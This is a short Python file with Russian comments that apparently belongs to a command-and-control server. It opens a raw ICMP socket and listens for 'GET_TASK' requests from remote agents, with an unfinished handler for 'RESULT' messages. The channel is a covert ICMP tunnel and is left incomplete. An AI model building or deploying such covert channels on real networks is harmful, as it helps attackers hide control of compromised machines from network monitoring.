import socket
import struct
import time

HOST = "0.0.0.0"

def checksum(data):
    summ = 0
    
    i = 0
    while i + 1 < len(data):
        word = struct.unpack_from("!H", data, i)[0]
        summ += word
        i += 2

    if i < len(data):
        summ += data[i]

    while summ >> 16:
        summ = (summ & 0xffff) + (summ >> 16)

    return (~summ) & 0xffff

def run_icmp(stop_event, task_manager):

    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
        #bind(), listen() и accept() не используется так как работа идет с сырыми сокетамши
        print("[+/ICMP] icmp-слушатель работает.")

        while not stop_event.is_set():
            ip_packet, address = s.recvfrom(1024)
            ip_len_hdr = (ip_packet[0] & 0x0f) * 4
            icmp_type = ip_packet[ip_len_hdr]
            icmp_payload = ip_packet[ip_len_hdr + 8:]
            
            if icmp_payload[:8] == "GET_TASK".encode('utf-8'):
                agent_id = icmp_payload[9:-1].decode('utf-8')
                print(f"Запрос задачи агентом {agent_id}")
            elif icmp_payload[:6] == "RESULT".encode('utf-8'):
                pass
                

            time.sleep(5)

    print("[+/ICMP] icmp-слушатель прекратил работу.")
